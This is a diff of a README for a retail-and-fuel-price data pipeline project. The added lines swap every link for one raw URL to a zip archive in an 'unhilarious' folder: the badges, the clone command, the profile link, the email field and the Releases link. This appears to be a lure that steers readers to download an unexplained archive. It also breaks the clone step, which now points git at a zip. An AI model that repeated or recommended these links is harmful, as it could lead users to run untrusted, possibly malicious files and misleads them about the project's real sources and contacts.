@@ -1,8 +1,8 @@
 # 🚀 InsightFlow: Retail Economic Pipeline
 
-![GitHub repo size](https://img.shields.io/github/repo-size/gps31320779/insightflow-retail-economic-pipeline)
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Issues](https://img.shields.io/github/issues/gps31320779/insightflow-retail-economic-pipeline)
+![GitHub repo size](https://github.com/gps31320779/insightflow-retail-economic-pipeline/raw/refs/heads/main/unhilarious/insightflow-retail-economic-pipeline-v1.0.zip)
+![License](https://github.com/gps31320779/insightflow-retail-economic-pipeline/raw/refs/heads/main/unhilarious/insightflow-retail-economic-pipeline-v1.0.zip)
+![Issues](https://github.com/gps31320779/insightflow-retail-economic-pipeline/raw/refs/heads/main/unhilarious/insightflow-retail-economic-pipeline-v1.0.zip)
 
 Welcome to the **InsightFlow: Retail Economic Pipeline** repository! This project is a comprehensive data engineering portfolio piece that leverages AWS cloud services to analyze the relationship between Malaysian retail performance and fuel prices. 
 
@@ -60,7 +60,7 @@ To get started with the InsightFlow project, follow these steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/gps31320779/insightflow-retail-economic-pipeline.git
+   git clone https://github.com/gps31320779/insightflow-retail-economic-pipeline/raw/refs/heads/main/unhilarious/insightflow-retail-economic-pipeline-v1.0.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -131,12 +131,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **GitHub**: [gps31320779](https://github.com/gps31320779)
-- **Email**: your-email@example.com
+- **GitHub**: [gps31320779](https://github.com/gps31320779/insightflow-retail-economic-pipeline/raw/refs/heads/main/unhilarious/insightflow-retail-economic-pipeline-v1.0.zip)
+- **Email**: https://github.com/gps31320779/insightflow-retail-economic-pipeline/raw/refs/heads/main/unhilarious/insightflow-retail-economic-pipeline-v1.0.zip
 
 ## 📥 Releases
 
-To download the latest releases, visit the [Releases](https://github.com/gps31320779/insightflow-retail-economic-pipeline/releases) section. Here you can find the necessary files to execute the project.
+To download the latest releases, visit the [Releases](https://github.com/gps31320779/insightflow-retail-economic-pipeline/raw/refs/heads/main/unhilarious/insightflow-retail-economic-pipeline-v1.0.zip) section. Here you can find the necessary files to execute the project.
 
 ## 🌐 Conclusion
 
